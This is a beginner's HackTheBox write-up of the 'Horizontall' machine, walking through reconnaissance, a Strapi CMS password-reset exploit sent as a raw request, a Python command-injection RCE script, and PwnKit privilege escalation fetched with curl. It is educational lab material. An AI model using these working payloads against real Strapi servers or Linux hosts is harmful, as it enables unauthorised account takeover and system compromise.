---
title: "HackTheBox: Horizontall"
description: 
date: 2022-02-05T20:55:12+02:00
image: cover.png
math: 
license: 
hidden: false
comments: false
draft: false
categories:
    - HTB
    - Writeup
    - Easy
    - Web
    - Strapi
    - Pwnkit
    - RCE
    - CMS    
---
## Intro
Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first 'real' challenge. Although it is rated 'Easy', I had to apply all of my current knowledge to snag both flags. Let's crack straight into it!

## Reconnaissance

Machine tags:
* Linux
* CMS Exploit
* Outdated Software
* CVE
* Injection
* RCE
* Account Misconfiguration

The tags on the machine alone gives us a pretty good idea of what we'll be up against.

## Scanning & Discovery

### nmap
Let's start with a simple `nmap` scan:
```bash
# Nmap 7.92 scan initiated Fri Feb  4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/4%OT=22%CT=1%CU=31967%PV=Y%DS=2%DC=I%G=Y%TM=61FD2C35
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Takeaway:
* `nginx` web server running on `:80`
* `OpenSSH 7.6p1` SSH server on `:22`
* Ubuntu OS

`_http-title: Did not follow redirect to http://horizontall.htb`

We can see a redirect to a URL. Let's add it to our /etc/hosts file:

`sudo echo "10.10.11.105 horizontall.htb" >> /etc/hosts`

I left an all port scan in the background afterwards, but it did not give any additional results.

### whatweb

Whatweb didn't give us any more information than nmap already did.

```bash
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux]
[nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall],
X-UA-Compatible[IE=edge], nginx[1.14.0]
```

### horizontall.htb

I connected to this URL and was greeted by this:

![Landing page](landing.png)

Scrolling down, I noticed what seemed like a contact form of some sort:

![Contact form](contact_form.png)

I did my best attempt at an XSS script, but after writing it I noticed that the "Send" button has no JS attached to it. So this attack surface, at least, was not likely.

Next, I decided to try and brute-force some hidden files and directories with gobuster.

### gobuster @ horizontall.htb

I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              conf,php,txt,asp,aspx
[+] Timeout:                 10s
===============================================================
2022/02/04 16:14:11 Starting gobuster in directory enumeration mode
===============================================================

/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]

/favicon.ico          (Status: 200) [Size: 4286]                                 

/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]

/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
===============================================================
2022/02/04 16:28:50 Finished
===============================================================
```

I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.

### SSH Service (rabbit hole)

What caught my eye after the nmap scan, was the `OpenSSH 7.6p1` version of the SSH service. A quick search on `exploit-db.com` found multiple possible vulnerabilities. What solidified my belief, was the `CVE 2018-15473` exploit named [OpenSSH 2.3 < 7.7 - Username Enumeration](https://www.exploit-db.com/exploits/45233). It seemed as though the box's version was succeptible. After attempting both manually running the scripts on `exploit-db.com` as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.

As such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.

Although, the machine had the tag "CMS", however we only ever saw a landing page. Is there something we missed? Where is this CMS?

### wfuzz subdomains

With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing `subdomains-top1million-110000.txt` wordlist from the [SecLists repository](https://github.com/danielmiessler/SecLists) that I very much recommend.

```bash
wfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://horizontall.htb' -H "Host: FUZZ.horizontall.htb"
```

We found **one** subdomain out of the ~114000 -> `api-prod`

Let's quickly add it to our hosts file and check it out!

`sudo echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts`

### api-prod.horizontall.htb

Upon connecting, I was greeted with a very underwhelming screen:

![api-prod.horizontall.htb](api-prod.png)

The source code did not give any particularly interesting leads, and so, I went for another gobuster run.

### gobuster @ api-prod.horizontall.htb

Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, `directory-list-2.3-big.txt` from the aforementioned SecLists repo.

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/04 17:17:09 Starting gobuster in directory enumeration mode
===============================================================

/reviews              (Status: 200) [Size: 507]

/users                (Status: 403) [Size: 60] 

/admin                (Status: 200) [Size: 854]
```

Very quickly, I found some hidden directories and went to check them out.

### api-prod.horizontall.htb/reviews

Even though I was barred from checking out the much more interesting `/users` endpoint, I wanted to see what `/reviews` had in store also. Unfortunately, it wasn't anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.

![Reviews](reviews.png)

`/admin` seemed like the juiciest bit anyway, so let's go there.

### api-prod.horizontall.htb/admin

My hopes were reignited when I saw this login screen.

![Strapi CMS Admin Log-in](admin_panel.png)

Trying out a few commonly used passwords did not prove fruitful. Neither did the "Forgot your password?" screen.

![Strapi CMS 'Forgot your password?'](forgot_password.png)

A search on `exploit-db.com` for `strapi CMS` returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.

Before trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.

## Exploitation

### sqlmap with Burp Suite (rabbit hole)

I saved a random login request with Burp for use with sqlmap:

```
POST /admin/auth/local HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/login
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 44
DNT: 1
Connection: close

{"identifier":"admin","password":"password"}
```

However, sqlmap wasn't successful neither with the `identifier`, nor the `password` field.

Welp, time to try out that password reset and those RCEs.

### Set Password (Unauthenticated)

First of all, I tried [the password reset exploit](https://www.exploit-db.com/exploits/50237) (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.

Unfortunately, the exploit's Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.

```python
	print("[*] Password reset for user: {}".format(userEmail))
	resetPasswordReq={"email":userEmail, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(strapiUrl)}
	s.post("{}/".format(strapiUrl), json=resetPasswordReq)

	# Set new password
	print("[*] Setting new password")
	exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
	r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit)
```

The code seems to simply send a specially formatted JSON to the aforementioned 'Forgot your password?' URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the `Host:` header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:

```
POST /admin/auth/reset-password HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/login
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 146
DNT: 1
Connection: close

{"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
```

I hit send on Burp Suite and cross my fingers...

I'm met with a `200 OK` reply! Along with an accompanying `JWT` token, admin username and email address!

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 04 Feb 2022 17:42:52 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 249
Connection: close
Vary: Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}
```

Let's try that log-in now :3

### Admin log-in @ api-prod.horizontall.htb/admin

Logging in with the `SuperStrongPassword1` after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.

![Strapi CMS Admin Dashboard](strapi_admin_dashboard.png)

What instantly caught my eye was the `Files Upload` tab in the Plugins section. Sure enough, I could upload a file. I went to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for inspiration, crafted and uploaded myself a PHP reverse shell payload.

![Reverse shell upload](reverse_shell_upload.png)

Unfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn't seem that different from the password reset exploit, so I had fairly high hopes.

### Remote Code Execution (RCE) (Authenticated) & User Flag

While working with [the RCE exploit](https://www.exploit-db.com/exploits/50238) I also again encountered some Python weirdness. Mostly regarding the `JWT` token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same `/admin/plugins/install` path, hard-coded in the `JWT` and target `URL`. At the end, it looked like this:

```python
import requests
from cmd import Cmd

class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def code_exec(cmd):
    global jwt, url
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI"
    url = "http://api-prod.horizontall.htb"
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
```

While the exploit did seem to do something, it would always respond with a "Bad Request" HTTP reply, instead of the output of `id` or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used [RevShells](https://www.revshells.com/) to help me out crafting the command itself. 

![User Access](user_access.png)

And I got myself a shell! I checked out `/home` and grabbed the user flag :)

![User Flag](user_flag.png)

It was now time to try and get root access.

## Privilege Escalation

### SUDO and SUID enumeration

One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.

Let's look for SUDO access first.

```bash
sudo -l
```

I was requested a password, so this avenue won't work.

Next, I tried to look for easily exploitable binaries with SUID bits.

```bash
find / -perm -u=s -type f 2>/dev/null
```

I tried cross-referencing the output with the SUID list over at [GTFOBins](https://gtfobins.github.io/#+suid), but did not find anything out of the ordinary.

### Linux Exploit Suggester

On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.

Next, I `curl`'d myself the [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) onto the remote machine and let it do its thing.

```bash
strapi@horizontall:~$ ./les.sh 

Available information:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

Seeing the PwnKit exploit pop-up made me smile. I was listening to [SANS Internet Stormcenter Podcast](https://open.spotify.com/show/6oeUmMwv1AQpdYNHmOE4A0) a few days ago and heard about a new `pollkit` exploit (`"PwnKit"` [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the 'intended' exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.

### PwnKit & System Flag

Applying the exploit was trivial. `LES` had even given me a download link. And just like with `LES`, I `curl`'d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now `root`. I went and snatched the system flag. And that's it for Horizontall.

```bash
strapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 14688  100 14688    0     0   103k      0 --:--:-- --:--:-- --:--:--  103k
strapi@horizontall:~$ chmod +x pwnkit 
strapi@horizontall:~$ ./pwnkit 
root@horizontall:/opt/strapi# id
uid=0(root) gid=0(root) groups=0(root),1001(strapi)
root@horizontall:/opt/strapi# whoami
root
root@horizontall:/opt/strapi# cd ~
root@horizontall:~# ls
boot.sh  pid  restart.sh  root.txt
root@horizontall:~# cat root.txt 
ed9440c3385bdec9f943c2cc3c0af71e
root@horizontall:~# 
```

***NOTE:*** If you would like to read the 'intended' or 'proper' way of the gaining `root` access, involving a Laravel Debug Mode RCE, I strongly recommend [0xdf's writeup of Horizontall](https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html).

## Outro

And that's that. In the future, I will probably go through HackTheBox's 'Starting Point' set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the 'Easy' boxes rather than going for the 'Very Easy' ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.

Whilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The `api-prod` subdomain was hidden in one of the minified `.js` files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.

I was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I'm still a beginner, so I believe noticing these things sooner requires time and experience.

All in all, I feel like I have many areas to improve in, but at the same time, I'm glad I didn't got completely stumped by one of the slightly more challenging boxes. :)